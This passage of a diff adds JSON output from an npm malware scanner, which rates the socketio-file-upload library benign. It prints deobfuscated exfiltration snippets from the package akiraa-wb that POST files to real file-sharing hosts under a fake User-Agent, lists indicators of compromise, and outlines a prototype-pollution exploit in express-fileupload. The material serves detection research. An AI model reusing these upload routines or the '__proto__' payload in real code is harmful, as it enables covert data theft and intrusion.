c};h=function(a){if(A[a.id])A[a.id]()};var q=function(a){if(z[a.id])z[a.id](a.name)},C=function(a){e[a.id]&&v(\"complete\",{file:e[a.id],detail:a.detail,success:a.success})},D=function(a){e[a.id]&&(v(\"error\",\n{file:e[a.id],message:a.message,code:0}),l&&(l[a.id].abort=!0))};if(E()&&b.wrapData){var G={chunk:h,ready:q,complete:C,error:D};k(c,m(),function(a){if(\"object\"!==typeof a)console.log(\"SocketIOFileUploadClient Error: You choose to wrap your data so the message from the server need to be an object\");else{var c=a[b.wrapData.unwrapKey&&\"string\"===typeof b.wrapData.unwrapKey.action?b.wrapData.unwrapKey.action:\"action\"];a=a[b.wrapData.unwrapKey&&\"string\"===typeof b.wrapData.unwrapKey.message?b.wrapData.unwrapKey.message:\n\"message\"];if(c&&a&&G[c])G[c](a);else console.log(\"SocketIOFileUploadClient Error: You choose to wrap your data but the message from the server is wrong configured. Check the message and your wrapData option\")}})}else k(c,m(\"_chunk\"),h),k(c,m(\"_ready\"),q),k(c,m(\"_complete\"),C),k(c,m(\"_error\"),D);this.exposePrivateFunction&&(this.chunckCallback=h,this.readyCallback=q,this.completCallback=C,this.errorCallback=D)}});",
+          "is_malicious": false,
+          "malice_score": 0.5474748174349467,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code accesses browser File and FileReader APIs to read user-selected files in chunks, optionally encoding file data as base64 or ArrayBuffer. It emits events and sends these chunks over a Socket.IO connection, facilitating file upload over the network. This enables client-side file exfiltration or transfer, potentially allowing unauthorized data leakage if misused.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a client-side library designed to facilitate file uploads over a Socket.IO connection by reading files in chunks and sending them to a server. While it uses sensitive APIs such as FileReader and network communication, these are used in a legitimate context for file upload functionality. Unlike the known malicious patterns, it does not perform automated or covert exfiltration to hardcoded external endpoints, nor does it obfuscate or randomize filenames to hide exfiltration. The code is openly licensed, well-documented, and intended for use in applications requiring file upload capabilities. The presence of event dispatching and user interaction (file input elements) further supports legitimate use. Therefore, despite the potential for misuse if integrated maliciously, the code itself is not inherently malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_068589_snippet_1",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5638730525970459,
+              "code_similarity": 0.4475841522216797,
+              "behavior_similarity": 0.6801619529724121,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const createFormData = (_0x28481b, _0x199329, _0xd1715e) => {\n  const { mime: _0xb2cb19 } = fromBuffer(_0x28481b) || {},\n    _0x1881ee = new FormData();\n  return (\n    _0x1881ee.append(_0x199329, _0x28481b, randomBytes + '.' + _0xd1715e),\n    _0x1881ee\n  );\n};",
+                "code_behavior": "At runtime, the code creates a multipart form-data object from arbitrary file buffers, attaches a randomized filename, and prepares the data for upload to external services, enabling covert file exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "This function is designed to package arbitrary file data for upload, which is not expected in a WhatsApp automation tool and enables unauthorized data exfiltration.",
+                  "violated_expectations": "Normal WhatsApp automation scripts do not require arbitrary file exfiltration or form-data creation for external uploads, especially without user consent.",
+                  "similar_legitimate_use": "Legitimate file upload utilities or cloud storage clients may use similar code, but only with explicit user action and consent.",
+                  "key_indicators": [
+                    "Automated creation of form-data from arbitrary file buffers",
+                    "Randomized filenames to obscure file origin",
+                    "Preparation of data for network exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (obfuscated JavaScript)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_4",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5408929586410522,
+              "code_similarity": 0.4442366063594818,
+              "behavior_similarity": 0.6375493407249451,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "// Similar pattern for other services\nfetch('https://catbox.moe/user/api.php', { method: 'POST', body: formData })\nfetch('https://pomf2.lain.la/upload.php', { method: 'POST', body: formData })\nfetch('https://upload.uploadcare.com/base/', { method: 'POST', body: formData })\nfetch('https://tmpfiles.org/api/v1/upload', { method: 'POST', body: formData })\nfetch('https://itzpire.site/tools/upload', { method: 'POST', body: formData })\nfetch('https://skizo.tech/api/upload', { method: 'POST', body: formData })",
+                "code_behavior": "At runtime, the code sends HTTP POST requests with file data as form-data to multiple hardcoded file-sharing endpoints, enabling mass exfiltration of files to attacker-controlled services without user awareness.",
+                "malice_analysis": {
+                  "why_suspicious": "Uploading files to a wide array of suspicious, hardcoded endpoints is a clear sign of mass data exfiltration and coordinated exfiltration attempts.",
+                  "violated_expectations": "A WhatsApp automation package should not interact with unrelated file-sharing services or perform bulk uploads to external domains.",
+                  "similar_legitimate_use": "Bulk uploaders or backup tools may contact multiple endpoints, but not in this context and never without user consent.",
+                  "key_indicators": [
+                    "Multiple hardcoded exfiltration endpoints",
+                    "Automated, silent network activity to file-sharing domains",
+                    "No user interaction or notification before upload"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_2",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5405087471008301,
+              "code_similarity": 0.4338391125202179,
+              "behavior_similarity": 0.6471783518791199,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "telegraPh: async (_0x3d2eed) => {\n  try {\n    const { ext: _0xa852ef } = await fromBuffer(_0x3d2eed),\n      _0x4e049a = await createFormData(_0x3d2eed, 'file', _0xa852ef),\n      _0x50070e = await fetch('https://telegra.ph/upload', {\n        method: 'POST',\n        body: _0x4e049a,\n      }),\n      _0x6354d9 = await _0x50070e.json();\n    if (_0x6354d9.error) {\n      throw _0x6354d9.error;\n    }\n    return 'https://telegra.ph' + _0x6354d9[0].src;\n  } catch (_0x574189) {\n    throw false;\n  }\n}",
+                "code_behavior": "At runtime, the code uploads arbitrary file data to https://telegra.ph/upload via HTTP POST, sending the file as form-data and returning the resulting URL, enabling silent exfiltration of user files.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated file uploads to external services without user interaction are a hallmark of data exfiltration and are not justified in the context of WhatsApp automation.",
+                  "violated_expectations": "A WhatsApp automation package should not upload arbitrary files to third-party file-sharing services, especially without user notification or consent.",
+                  "similar_legitimate_use": "A legitimate file-sharing client or backup tool may upload files, but only with user consent and clear intent.",
+                  "key_indicators": [
+                    "Hardcoded upload endpoint (telegra.ph)",
+                    "No user notification or consent before upload",
+                    "Automated network exfiltration of file data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787969_snippet_1",
+              "source_package": "express-fileupload (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787969/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5365736484527588,
+              "code_similarity": 0.47140324115753174,
+              "behavior_similarity": 0.6017440557479858,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "app.use(fileUpload({ parseNested: true }));",
+                "code_behavior": "At runtime, when handling HTTP file uploads, the code enables the 'parseNested' option, causing uploaded form data to be recursively parsed and assigned to nested object properties, including special properties like '__proto__', resulting in prototype pollution.",
+                "malice_analysis": {
+                  "why_suspicious": "Enabling 'parseNested' without input sanitization allows user-supplied data to modify object prototypes, creating a classic prototype pollution vulnerability.",
+                  "violated_expectations": "Normal file upload handling should not allow user input to affect global object prototypes or application logic; user data should be isolated from core JavaScript object structures.",
+                  "similar_legitimate_use": "Nested parsing is legitimate for complex form data structures, but must be implemented with strict sanitization to prevent prototype pollution.",
+                  "key_indicators": [
+                    "parseNested: true without input sanitization",
+                    "Direct assignment of user data to object keys, including '__proto__'"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when handling HTTP file uploads)",
+                  "file_location": "application code where express-fileupload is initialized with parseNested: true",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "express-fileupload",
+                  "package_manager": "npm",
+                  "package_versions": "all versions < 1.1.9 (CVE-2020-7699)",
+                  "why_malicious": "The package contains a critical security flaw in its 'parseNested' option, which allows prototype pollution by recursively parsing and assigning user-supplied form data to object properties, including special properties like '__proto__'. This enables attackers to corrupt global object prototypes, potentially leading to denial-of-service (DoS) or, in certain configurations, remote code execution (RCE) through manipulation of downstream libraries."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends a crafted HTTP multipart/form-data request with a field named '__proto__.toString' or another prototype property.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Prototype pollution in the application"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The express-fileupload module with parseNested: true parses the request and assigns the malicious property to Object.prototype.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Global object prototype is polluted"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Application logic or downstream libraries (such as EJS) are affected by the polluted prototype, potentially leading to denial-of-service or remote code execution.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Denial-of-service or remote shell access"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "HTTP multipart/form-data requests with field names containing '__proto__' or other prototype properties",
+                    "Unexpected modification of Object.prototype properties at runtime",
+                    "Application errors (HTTP 500) or crashes after file upload with parseNested enabled",
+                    "Unusual behavior in downstream libraries (e.g., EJS) following file uploads"
+                  ],
+                  "file_indicators": [
+                    "Usage of app.use(fileUpload({ parseNested: true })) in application code",
+                    "Presence of form fields named '__proto__', '__proto__.toString', or similar in upload requests"
+                  ],
+                  "network_indicators": [
+                    "Inbound HTTP requests with multipart/form-data and suspicious field names targeting prototype properties",
+                    "Outbound connections from Node.js processes (e.g., if a reverse shell is triggered after file upload)"
+                  ],
+                  "how_to_detect": "Monitor HTTP multipart/form-data requests for field names such as '__proto__', '__proto__.toString', or other prototype properties. Audit application code for use of express-fileupload with parseNested: true. Watch for unexpected changes to Object.prototype or frequent HTTP 500 errors after file uploads. In environments using EJS or similar templating engines, monitor for unexpected child_process execution or outbound network connections from the application process, which may indicate remote code execution."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_3",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5345116257667542,
+              "code_similarity": 0.4410051107406616,
+              "behavior_similarity": 0.6280181407928467,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "Uguu: async (_0x267cd4) => {\n  try {\n    const { ext: _0x331701, mime: _0x135427 } =\n        (await fromBuffer(_0x267cd4)) || {},\n      _0x49a3e9 = createFormData(_0x267cd4, 'files[]', _0x331701),\n      _0x27a6fc = await fetch('https://uguu.se/upload.php', {\n        method: 'POST',\n        body: _0x49a3e9,\n        headers: { 'User-Agent': fakeUserAgent() },\n      }),\n      _0x565f49 = await _0x27a6fc.json();\n    return _0x565f49.files[0].url;\n  } catch (_0x32a889) {\n    throw false;\n  }\n}",
+                "code_behavior": "At runtime, the code uploads arbitrary file data to https://uguu.se/upload.php via HTTP POST, using a fake User-Agent header to evade detection, and returns the uploaded file's URL, facilitating covert exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of a fake User-Agent and automated upload to a file-sharing service is a strong indicator of covert exfiltration and evasion of network monitoring.",
+                  "violated_expectations": "Normal automation scripts do not upload files to external services or attempt to disguise their network traffic with fake User-Agents.",
+                  "similar_legitimate_use": "Legitimate uploaders may set custom User-Agents, but not in the context of a WhatsApp bot or without user awareness.",
+                  "key_indicators": [
+                    "Fake User-Agent usage in network requests",
+                    "Hardcoded upload endpoint (uguu.se)",
+                    "Automated, silent file exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (deobfuscated JavaScript)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/socketio-file-upload/0.7.3/package/server.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "server_slice_1",
+          "code_snippet": "var util = require(\"util\"),\n\tEventEmitter = require(\"events\").EventEmitter,\n\tpath = require(\"path\"),\n\tfs = require(\"fs\");\n\nfunction SocketIOFileUploadServer(options) {\n\t\"use strict\";\n\n\tEventEmitter.call(this);\n\tvar self = this; // avoids context issues\n\n\tvar _getOption = function (key, defaultValue) {\n\t\tif(!options) {\n\t\t\treturn defaultValue;\n\t\t}\n\t\treturn options[key] || defaultValue;\n\t};\n\n\tself.dir = _getOption(\"dir\", null);\n\tself.mode = _getOption(\"mode\", \"0666\");\n\tself.maxFileSize = _getOption(\"maxFileSize\", null);\n\tself.emitChunkFail = _getOption(\"emitChunkFail\", false);\n\tself.topicName = _getOption(\"topicName\", \"siofu\");\n\tself.wrapData = _getOption(\"wrapData\", false);\n\n\tvar _isWrapDataWellConfigured = function () {\n\t\tif (typeof self.wrapData === \"boolean\") {\n\t\t\treturn true;\n\t\t}\n\t\tif (typeof self.wrapData !== \"object\" || Array.isArray(self.wrapData)) {\n\t\t\treturn false;\n\t\t}\n\n\t\tif(!self.wrapData.wrapKey || typeof self.wrapData.wrapKey.action !== \"string\" || typeof self.wrapData.wrapKey.message !== \"string\" ||\n\t\t\t!self.wrapData.unwrapKey || typeof self.wrapData.unwrapKey.action !== \"string\" || typeof self.wrapData.unwrapKey.message !== \"string\") {\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t};\n\n\tself.exposePrivateFunction = _getOption(\"exposePrivateFunction\", false);\n\n\tself.uploadValidator = function(event, callback){\n\t\tcallback(true);\n\t};\n\n\tvar _getTopicName = function (topicExtension) {\n\t\tif (self.wrapData) {\n\t\t\treturn self.topicName;\n\t\t}\n\n\t\treturn self.topicName + topicExtension;\n\t};\n\n\tvar _wrapData = function (data, action) {\n\t\tif(!_isWrapDataWellConfigured() || !self.wrapData) {\n\t\t\treturn data;\n\t\t}\n\t\tvar dataWrapped = {};\n\t\tif(self.wrapData.additionalData) {\n\t\t\tObject.assign(dataWrapped, self.wrapData.additionalData);\n\t\t}\n\n\t\tvar actionKey = self.wrapData.wrapKey && typeof self.wrapData.wrapKey.action === \"string\" ? self.wrapData.wrapKey.action : \"action\";\n\t\tvar messageKey = self.wrapData.wrapKey && typeof self.wrapData.wrapKey.message === \"string\" ? self.wrapData.wrapKey.message : \"message\";\n\n\t\tdataWrapped[actionKey] = action;\n\t\tdataWrapped[messageKey] = data;\n\t\treturn dataWrapped;\n\t};\n\n\tvar files = [];\n\n\tvar _emitComplete = function (socket, id, success) {\n\t\tvar fileInfo = files[id];\n\n\t\tif (!fileInfo) {\n\t\t\treturn;\n\t\t}\n\n\t\tsocket.emit(_getTopicName(\"_complete\"), _wrapData({\n\t\t\tid: id,\n\t\t\tsuccess: success,\n\t\t\tdetail: fileInfo.clientDetail\n\t\t}, \"complete\"));\n\t};\n\n\tvar _findFileNameWorker = function (ext, base, inc, next) {\n\t\tvar newBase = (inc === -1) ? base : base + \"-\" + inc;\n\t\tvar pathName = path.join(self.dir, newBase + ext);\n\t\tfs.exists(pathName, function (exists) {\n\t\t\tif (exists) {\n\t\t\t\t_findFileNameWorker(ext, base, inc + 1, next);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tfs.open(pathName, \"w\", self.mode, function (err, fd) {\n\t\t\t\t\tif (err) {\n\t\t\t\t\t\tnext(err);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tnext(null, newBase, pathName, fd);\n\t\t\t\t});\n\t\t\t}\n\t\t});\n\t};\n\n\tvar _findFileName = function (fileInfo, next) {\n\t\tvar filesafeName = fileInfo.name\n\t\t\t.replace(/[\\/\\?<>\\\\:\\*\\|\":]|[\\x00-\\x1f\\x80-\\x9f]|^\\.+$/g, \"_\");\n\n\t\tvar ext = path.extname(filesafeName);\n\t\tvar base = path.basename(filesafeName, ext);\n\n\t\t_findFileNameWorker(ext, base, -1, function (err, newBase, pathName, fd) {\n\t\t\tif (err) {\n\t\t\t\tnext(err);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tfs.close(fd, function (err) {\n\t\t\t\tif (err) {\n\t\t\t\t\tnext(err);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tnext(null, newBase, pathName);\n\t\t\t});\n\t\t});\n\t};\n\n\tvar _uploadDone = function (socket) {\n\t\treturn function (data) {\n\t\t\tvar fileInfo = files[data.id];\n\n\t\t\tif (!fileInfo) {\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\ttry {\n\t\t\t\tif (fileInfo.writeStream) {\n\t\t\t\t\tfs.utimes(fileInfo.pathName, new Date(), fileInfo.mtime, function (err) {\n\t\t\t\t\t\tif (!files[data.id]) {\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tif (err) {\n\t\t\t\t\t\t\tfileInfo.success = false;\n\t\t\t\t\t\t\t_emitComplete(socket, data.id, fileInfo.success);\n\t\t\t\t\t\t\tconsole.log(\"SocketIOFileUploadServer Error (_uploadDone fs.utimes):\");\n\t\t\t\t\t\t\tconsole.log(err);\n\t\t\t\t\t\t\t_cleanupFile(data.id);\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_cleanupFile1(data.id);\n\t\t\t\t\t\tself.emit(\"saved\", {\n\t\t\t\t\t\t\tfile: fileInfo\n\t\t\t\t\t\t});\n\t\t\t\t\t\t_emitComplete(socket, data.id, fileInfo.success);\n\t\t\t\t\t\t_cleanupFile2(data.id);\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t_emitComplete(socket, data.id, fileInfo.success);\n\t\t\t\t\t_cleanupFile(data.id);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (err) {\n\t\t\t\tconsole.log(\"SocketIOFileUploadServer Error (_uploadDone):\");\n\t\t\t\tconsole.log(err);\n\t\t\t}\n\n\t\t\tself.emit(\"complete\", {\n\t\t\t\tfile: fileInfo,\n\t\t\t\tinterrupt: !!data.interrupt\n\t\t\t});\n\t\t};\n\t};\n\n\tvar _uploadProgress = function (socket) {\n\t\treturn function (data) {\n\t\t\tvar fileInfo = files[data.id], buffer;\n\n\t\t\tif (!fileInfo) {\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\ttry {\n\t\t\t\tif (data.base64) 